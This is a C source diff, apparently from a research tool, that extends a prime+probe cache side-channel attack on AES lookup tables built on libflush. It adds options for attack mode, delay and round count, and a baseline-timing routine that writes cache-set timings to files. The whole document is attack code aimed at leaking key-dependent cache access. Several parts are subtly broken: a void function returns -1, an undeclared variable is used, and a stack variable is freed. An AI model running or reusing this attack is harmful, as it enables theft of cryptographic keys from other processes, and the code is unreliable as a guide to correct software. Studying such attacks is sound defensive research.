@@ -24,6 +24,11 @@
 #define AES_TABLE_SUM 64
 #define AES_TABLE_BASE 100
 #define CACHE_SET_NUMS 512
+#define BASE_COUNTS 1000
+#define DELAY_TIME 10
+#define SUM_COUNTS 10000
+#define MODE_ATTACK 1
+#define NODE_BASE 0
 
 #define _STR(x) #x
 #define STR(x) _STR(x)
@@ -32,6 +37,9 @@
 static void print_help(char* argv[]) {
   fprintf(stdout, "Usage: %s [OPTIONS]\n", argv[0]);
   fprintf(stdout, "\t-c, -cpu <value>\t Bind to cpu (default: " STR(BIND_TO_CPU) ")\n");
+  fprintf(stdout, "\t-m, -mode <value>\t program mode (default: " STR(MODE_ATTACK) ")\n");
+  fprintf(stdout, "\t-d, -delay <value>\t delay between prime and probe (default: " STR(DELAY_TIME) ")\n");
+  fprintf(stdout, "\t-s, -sum <value>\t attack sum counts (default: " STR(SUM_COUNTS) ")\n");
   fprintf(stdout, "\t-b, -base <value>\t Table base set (default: " STR(AES_TABLE_BASE) ")\n");
   fprintf(stdout, "\t-t, -help\t\thelp page\n");
 } 
@@ -40,10 +48,15 @@ static void print_help(char* argv[]) {
 int main(int argc, char* argv[]) {
   libflush_session_t *libflush_session;
 
+  size_t delay = DELAY_TIME;
+  size_t sum = SUM_COUNTS;
+
   /* Define parameters */
   size_t cpu = BIND_TO_CPU;
   size_t thread_cpu = BIND_THREAD_TO_CPU;
   size_t base = AES_TABLE_BASE;
+
+  size_t mode = MODE_ATTACK;
 
   size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
   fprintf(stdout, "NUMBER OF CPUS: %zu\n", number_of_cpus);
@@ -51,7 +64,10 @@ int main(int argc, char* argv[]) {
   static const char* short_options = "t:b:h";
   static struct option long_options[] = {
     {"cpu", required_argument, NULL, 'c'},
+    {"mode", required_argument, NULL, 'm'},
     {"base", required_argument, NULL, 'b'},
+    {"delay", required_argument, NULL, 'd'},
+    {"sum", required_argument, NULL, 's'},
     {"help", no_argument, NULL, 'h'},
     {NULL, 0, NULL, 0}
   };
@@ -70,6 +86,27 @@ int main(int argc, char* argv[]) {
         base = atoi(optarg);
         if (base >= CACHE_SET_NUMS || base < 0) {
           fprintf(stderr, "Error: base %zu in not available.\n", base);
+          return -1;
+        }
+        break;
+      case 'd':
+        delay = atoi(optarg);
+        if (delay < 0) {
+          fprintf(stderr, "Error: delay %zu in not available.\n", delay);
+          return -1;
+        }
+        break;
+      case 's':
+        sum = atoi(optarg);
+        if (sum < 0) {
+          fprintf(stderr, "Error: sum %zu in not available.\n", sum);
+          return -1;
+        }
+        break;
+      case 'm':
+        mode = atoi(optarg);
+        if (mode != 0 && mode != 1) {
+          fprintf(stderr, "Error: mode %zu in not available.\n", mode);
           return -1;
         }
         break;
@@ -103,25 +140,29 @@ int main(int argc, char* argv[]) {
   fprintf(stdout, "initialize libflush success!\n");
   fprintf(stdout, "now start asynchronized aes attack\n");
 
-  uint32_t *tmp;
-  tmp = (uint32_t *)malloc(AES_TABLE_SUM * sizeof(uint32_t));
-  if (tmp == NULL) {
-    fprintf(stderr, "ERROR : could not allocate memory to tmp!!\n");
-    return -1;
-  }
-  memset(tmp, 0, AES_TABLE_SUM * sizeof(uint32_t));
+  if (mode == MODE_ATTACK) {
+    uint32_t *tmp;
+    tmp = (uint32_t *)malloc(AES_TABLE_SUM * sizeof(uint32_t));
+    if (tmp == NULL) {
+      fprintf(stderr, "ERROR : could not allocate memory to tmp!!\n");
+      return -1;
+    }
+    memset(tmp, 0, AES_TABLE_SUM * sizeof(uint32_t));
 
-  while (true) {
-    getTmpTime2(libflush_session, tmp, base);
-    usleep(50);
+    for (int i = 0; i < sum; i++) {
+      getTmpTime2(libflush_session, tmp, base, delay);
+      usleep(delay);
+    }
+    free(tmp);
+    fprintf(stdout, "aes asynchronized attack completed\n");
+  } else {
+    fprintf(stdout, "calculate base time\n");
+    getBaseTime(libflush_session);
   }
-
-  free(tmp);
-  fprintf(stdout, "aes asynchronized attack completed\n");
   return 0;
 }
 
-void getTmpTime(libflush_session_t *libflush_session, uint32_t *tmp, int base) {
+void getTmpTime(libflush_session_t *libflush_session, uint32_t *tmp, int base, int delay) {
   int base0 = base;
   int base1 = base + 16;
   int base2 = base + 32;
@@ -132,7 +173,7 @@ void getTmpTime(libflush_session_t *libflush_session, uint32_t *tmp, int base) {
     libflush_prime(libflush_session, base2 + j);
     libflush_prime(libflush_session, base3 + j);
   }
-  usleep(10);
+  usleep(delay);
   for (int j = 0; j < AES_TABLE_LENGTN; j++) {
     tmp[j + AES_TABLE_LENGTN * 0] = libflush_probe(libflush_session, base0 + j);
     tmp[j + AES_TABLE_LENGTN * 1] = libflush_probe(libflush_session, base1 + j);
@@ -142,25 +183,51 @@ void getTmpTime(libflush_session_t *libflush_session, uint32_t *tmp, int base) {
   writeT2TF(tmp);
 }
 
-void getTmpTime2(libflush_session_t *libflush_session, uint32_t *tmp, int base) {
+//获取aes table占用的set的prime probe访问时间
+void getTmpTime2(libflush_session_t *libflush_session, uint32_t *tmp, int base, int delay) {
   for (int j = 0; j < AES_TABLE_SUM; j++) {
     libflush_prime(libflush_session, base + j);
   }
-  usleep(10);
+  usleep(delay);
   for (int j = 0; j < AES_TABLE_SUM; j++) {
     tmp[j] = libflush_probe(libflush_session, base + j);
   }
   writeT2TF(tmp);
 }
 
-void getTmpTime3(libflush_session_t *libflush_session, uint32_t *tmp, int base) {
+//获取各个set的基准时间
+void getBaseTime(libflush_session_t *libflush_session) {
   uint64_t time = 0;
-  for (int j = 0; j < AES_TABLE_SUM; j++) {
+  uint32_t *tmp;
+  tmp = (uint32_t *)malloc(BASE_COUNTS * sizeof(uint32_t));
+  if (tmp == NULL) {
+    fprintf(stderr, "ERROR : could not allocate memory to tmp!!\n");
+    return -1;
+  }
+  memset(tmp, 0, BASE_COUNTS * sizeof(uint32_t));
+  for (int i = 0; i < CACHE_SET_NUMS; i++) {
+    for (int j = 0; j < BASE_COUNTS; j++) {
     libflush_prime(libflush_session, base + j);
     time = libflush_probe(libflush_session, base + j);
     tmp[j] = time;
+    }
+    writeBaseTime(tmp);
   }
-  writeT2TF(tmp);
+  free(tmp);
+}
+
+void writeBaseTime(uint32_t *tmp) {
+  FILE* file = NULL;
+  if ((file = fopen("asynbase", "a")) == NULL) {
+    fprintf(stderr, "ERROR : could not open file asynbase!\n");
+    return;
+  }
+  for (int i = 0; i < BASE_COUNTS; i++) {
+    fprintf(file, "%10zu", tmp[i]);
+  }
+  fprintf(file, "\n");
+  fflush(file);
+  fclose(file);
 }
 
 void writeT2TF(uint32_t *tmp) {
@@ -176,7 +243,7 @@ void writeT2TF(uint32_t *tmp) {
   fprintf(file, "%d:%d:%d ", lt->tm_hour, lt->tm_min, lt->tm_sec);
   free(&time_stamp);
   for (int i = 0; i < AES_TABLE_SUM; i++) {
-      fprintf(file, "%10zu", tmp[i]);
+    fprintf(file, "%10zu", tmp[i]);
   }
   fprintf(file, "\n");
   fflush(file);
@@ -184,19 +251,4 @@ void writeT2TF(uint32_t *tmp) {
   for (int i = 0; i <AES_TABLE_SUM; i++) {
     tmp[i] = 0;
   }
-}
-
-void writeTimeStamp() {
-  time_t time_stamp;
-  struct tm* lt;
-  FILE *file = NULL;
-  if ((file = fopen("asyntime", "a")) == NULL) {
-    fprintf(stderr, "ERROR : could not open file ntime!\n");
-    return;
-  }
-  time(&time_stamp);
-  lt = localtime(&time_stamp);
-  fprintf(file, "%d:%d:%d ", lt->tm_hour, lt->tm_min, lt->tm_sec);
-  free(&time_stamp);
-  fclose(file);
 }
